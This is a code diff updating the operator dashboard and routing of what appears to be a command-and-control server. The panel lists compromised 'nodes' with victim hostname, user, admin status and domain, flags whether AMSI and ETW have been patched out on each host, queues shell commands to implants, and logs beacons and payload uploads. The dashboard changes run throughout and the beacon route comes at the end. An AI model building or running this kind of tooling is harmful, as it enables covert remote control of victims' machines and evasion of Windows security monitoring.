+      pollEl.textContent = 'SYNC '+now.toUTCString().slice(17,25)+' UTC';
+      pollEl.style.color = 'var(--accent)';
+      setTimeout(()=>{ if(pollEl) pollEl.style.color='var(--muted)'; }, 1400);
     }
 
     if (!entries.length) {
       if (box.dataset.sid !== selectedSid) {
-        box.innerHTML = '<div style="color:var(--muted);font-size:10px;letter-spacing:.1em;padding:16px;text-transform:uppercase">Awaiting output...</div>';
+        box.innerHTML = '<div style="padding:20px 14px;color:var(--muted);font-size:10px;letter-spacing:.1em;text-transform:uppercase;opacity:.5">// no output received yet — awaiting beacon</div>';
         box.dataset.sid = selectedSid;
       }
       lastResultCount = 0;
@@ -1023,21 +1081,31 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
     }
 
     const hasNew = entries.length !== lastResultCount;
-    if (!hasNew && box.dataset.sid === selectedSid) return; // no change, skip redraw
+    if (!hasNew && box.dataset.sid === selectedSid) return;
 
-    const atBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 40;
+    const atBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 60;
     const sorted = entries.slice().sort((a,b)=>a.ts<b.ts?-1:1);
-    box.innerHTML = sorted.map((e)=>
-      \`<div class="result-entry">
-        <div class="result-ts"><span class="ts-label">OUTPUT</span>\${esc(e.ts)}</div>
-        <div class="result-body">\${esc(e.output)}</div>
-      </div>\`
-    ).join('');
-    box.dataset.sid = selectedSid;
 
-    if (atBottom || entries.length > lastResultCount) {
-      box.scrollTop = box.scrollHeight;
-    }
+    box.innerHTML = sorted.map((e, i)=>{
+      const lines = esc(e.output).split('\\n');
+      const lineHtml = lines.map((l,li)=>
+        \`<div style="display:flex;min-height:1.75em"><span style="min-width:26px;text-align:right;color:var(--muted2);font-size:9px;user-select:none;padding-right:8px;line-height:1.75;flex-shrink:0">\${li+1}</span><span style="flex:1;word-break:break-word">\${l||'&nbsp;'}</span></div>\`
+      ).join('');
+      const ts = e.ts.replace('T',' ').slice(0,19);
+      const byteLen = new TextEncoder().encode(e.output).length;
+      return \`<div class="result-entry">
+        <div class="result-hdr">
+          <span class="r-idx">#\${i+1}</span>
+          <span class="r-label">OUTPUT</span>
+          <span class="r-ts">\${ts} UTC</span>
+          <span class="r-len">\${byteLen}B / \${lines.length}L</span>
+        </div>
+        <div class="result-body" style="padding-left:12px">\${lineHtml}</div>
+      </div>\`;
+    }).join('');
+
+    box.dataset.sid = selectedSid;
+    if (atBottom || entries.length > lastResultCount) box.scrollTop = box.scrollHeight;
     lastResultCount = entries.length;
   }
   window.fetchResults = fetchResults;
@@ -1051,28 +1119,27 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
     const s = sessions.find(x=>x.session===selectedSid);
     if (!s) return;
     const recon = s.recon||{};
-    // session header meta
-    const parts = [s.remote_ip, recon.hostname, recon.os].filter(Boolean);
-    document.getElementById('sel-meta').textContent = parts.join(' // ');
-    // recon pane
+    const parts = [recon.hostname, s.remote_ip, recon.user].filter(Boolean);
+    document.getElementById('sel-meta').textContent = parts.join('  //  ');
     const cells = [
-      {k:'hostname',v:recon.hostname,cls:'hi'},
-      {k:'user',v:recon.user,cls:''},
-      {k:'elevated',v:recon.elevated?'YES':'NO',cls:recon.elevated?'danger':''},
-      {k:'remote ip',v:s.remote_ip,cls:''},
-      {k:'os',v:recon.os,cls:''},
-      {k:'build',v:recon.build,cls:''},
-      {k:'arch',v:recon.arch,cls:''},
-      {k:'domain',v:recon.domain,cls:''},
-      {k:'amsi patched',v:recon.amsi?'YES':'NO',cls:recon.amsi?'hi':'warn'},
-      {k:'etw patched',v:recon.etw?'YES':'NO',cls:recon.etw?'hi':'warn'},
-      {k:'first seen',v:s.first_seen,cls:''},
-      {k:'last beacon',v:s.last_beacon,cls:''},
-      {k:'pending tasks',v:s.pending_tasks,cls:s.pending_tasks>0?'warn':''},
-      {k:'results',v:s.result_count,cls:''},
-    ].filter(c=>c.v!=null&&c.v!=='');
+      {k:'hostname',     v:recon.hostname,                          cls:'hi'},
+      {k:'username',     v:recon.user,                              cls:''},
+      {k:'elevated',     v:recon.elevated?'YES — ADMIN':'NO',       cls:recon.elevated?'danger':'warn'},
+      {k:'remote ip',    v:s.remote_ip,                             cls:''},
+      {k:'os',           v:recon.os,                                cls:''},
+      {k:'build',        v:recon.build,                             cls:''},
+      {k:'arch',         v:recon.arch,                              cls:''},
+      {k:'domain',       v:recon.domain,                            cls:''},
+      {k:'amsi patched', v:recon.amsi?'PATCHED':'NO',               cls:recon.amsi?'hi':'warn'},
+      {k:'etw patched',  v:recon.etw?'PATCHED':'NO',                cls:recon.etw?'hi':'warn'},
+      {k:'first seen',   v:s.first_seen?.replace('T',' ').slice(0,19)+' UTC',  cls:''},
+      {k:'last beacon',  v:s.last_beacon?.replace('T',' ').slice(0,19)+' UTC', cls:''},
+      {k:'idle',         v:fmt(s.idle_seconds||0),                  cls:s.idle_seconds>180?'warn':''},
+      {k:'queued tasks', v:s.pending_tasks,                         cls:s.pending_tasks>0?'warn':'hi'},
+      {k:'result count', v:s.result_count,                          cls:''},
+    ].filter(c=>c.v!=null&&c.v!==''&&c.v!=='undefined UTC');
     document.getElementById('recon-pane').innerHTML =
-      '<div class="recon-grid">' +
+      '<div class="recon-grid">'+
       cells.map(c=>\`<div class="recon-cell"><div class="recon-key">\${esc(c.k)}</div><div class="recon-val \${c.cls}">\${esc(String(c.v))}</div></div>\`).join('')+
       '</div>';
   }
@@ -1083,11 +1150,12 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
     const input = document.getElementById('cmd-input');
     const cmd = preset || input.value.trim();
     if (!cmd) return;
+    if (!preset && cmd) { cmdHistory.unshift(cmd); if(cmdHistory.length>50)cmdHistory.pop(); cmdHistIdx=-1; }
     const r = await api('/task', {method:'POST', body:JSON.stringify({session:selectedSid,cmd})});
     if (!r) return;
     const data = await r.json();
     if (data.status==='queued') {
-      toast('QUEUED // DEPTH='+data.queue_depth);
+      toast('QUEUED  depth='+data.queue_depth);
       if (!preset) input.value='';
     } else {
       toast('ERROR: '+JSON.stringify(data),'err');
@@ -1095,13 +1163,29 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
   }
   window.sendCmd = sendCmd;
 
+  function handleKey(e) {
+    if (e.key==='Enter') { sendCmd(); return; }
+    const input = document.getElementById('cmd-input');
+    if (e.key==='ArrowUp') {
+      e.preventDefault();
+      if (cmdHistIdx < cmdHistory.length-1) { cmdHistIdx++; input.value=cmdHistory[cmdHistIdx]; }
+    } else if (e.key==='ArrowDown') {
+      e.preventDefault();
+      if (cmdHistIdx > 0) { cmdHistIdx--; input.value=cmdHistory[cmdHistIdx]; }
+      else { cmdHistIdx=-1; input.value=''; }
+    }
+  }
+  window.handleKey = handleKey;
+
   // ── Kill ──
   async function killSession() {
-    if (!selectedSid || !confirm('Queue exit command for '+selectedSid+'?')) return;
+    if (!selectedSid || !confirm('Send EXIT to node '+selectedSid+'?\nThis queues an exit command — node will stop beaconing.')) return;
     const r = await api('/sessions/'+encodeURIComponent(selectedSid),{method:'DELETE'});
     if (!r) return;
-    toast('EXIT QUEUED');
+    toast('EXIT QUEUED FOR NODE');
     selectedSid = null;
+    document.getElementById('hdr-sel').textContent='—';
+    document.getElementById('hdr-sel').style.color='var(--muted)';
     document.getElementById('session-header').style.display = 'none';
     document.getElementById('empty-state').style.display = 'flex';
     document.getElementById('output-pane').style.display = 'none';
@@ -1113,31 +1197,40 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
 
   // ── Audit ──
   async function fetchAudit() {
-    const r = await api('/audit?limit=80');
+    const r = await api('/audit?limit=100');
     if (!r) return;
     const data = await r.json();
     const list = document.getElementById('audit-list');
     const entries = (data.entries||[]).slice().reverse();
-    if (!entries.length) { list.innerHTML = '<div class="no-sessions">NO ENTRIES</div>'; return; }
+    if (!entries.length) { list.innerHTML = '<div class="no-audit">NO ENTRIES</div>'; return; }
     list.innerHTML = entries.map(e=>{
       const t = e.ts.replace('T',' ').slice(0,19);
+      const actionColor = {
+        task_queued:'var(--yellow)', kill_session:'var(--red)',
+        get_results:'var(--blue)', beacon:'var(--accent)',
+        payload_uploaded:'var(--orange)'
+      }[e.action] || 'var(--muted)';
       return \`<div class="audit-entry \${esc(e.action)}">
         <div class="a-time">\${t}</div>
-        <div class="a-action">\${esc(e.action)}</div>
+        <div class="a-action" style="color:\${actionColor}">\${esc(e.action).replace(/_/g,' ')}</div>
         <div class="a-ip">\${esc(e.ip)}</div>
       </div>\`;
     }).join('');
   }
   window.fetchAudit = fetchAudit;
 
-  function fmt(s){return s<60?s+'s':s<3600?Math.floor(s/60)+'m':Math.floor(s/3600)+'h'}
-  function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
+  function fmt(s){
+    if(!s&&s!==0)return'—';
+    s=Math.floor(s);
+    return s<60?s+'s':s<3600?Math.floor(s/60)+'m '+((s%60)||'')+'s':Math.floor(s/3600)+'h '+Math.floor((s%3600)/60)+'m';
+  }
+  function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
 
   // ── Boot ──
   refreshSessions();
   fetchAudit();
   pollTimer = setInterval(()=>{refreshSessions();if(selectedSid)fetchResults();},5000);
-  auditTimer = setInterval(fetchAudit,15000);
+  auditTimer = setInterval(fetchAudit,12000);
 })();
 </script>
 </body>
@@ -1203,10 +1296,6 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
   if (path === "/health" && method === "GET") {
     return withCORS(handleHealth(), env);
   }
-  if (path === "/ping" && method === "GET") {
-    return withCORS(new Response("OK", { status: 200 }), env);
-  }
-
   // ── Beacon routes (X-Beacon-Token) ────────────────────
   if (path === "/beacon" && method === "POST") {
     const authErr = requireBeaconToken(request, env);
